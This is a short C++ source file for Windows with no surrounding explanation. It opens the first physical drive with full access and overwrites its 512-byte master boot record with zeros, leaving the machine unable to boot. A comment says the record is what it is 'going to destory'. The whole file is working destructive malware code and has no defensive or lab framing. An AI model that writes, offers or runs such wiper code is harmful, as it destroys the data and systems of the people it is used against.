#include<Windows.h>
#include<iostream>
#include "stdafx.h"

using namespace std;
#define MBR_SIZE 512

int main()
{
	DWORD write;
	char mbrData[MBR_SIZE];//size of the mbr is just 512 bytes , which we are going to "destory"
						   //overwrite
	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);

	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE)
	{
		cout << "Master Boot Record is overwritten" << endl;
		Sleep(5000);
		ExitProcess(0);
	}
	else
	{
		cout << "Failed";
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MasterBootRecord);
	return EXIT_SUCCESS;
}

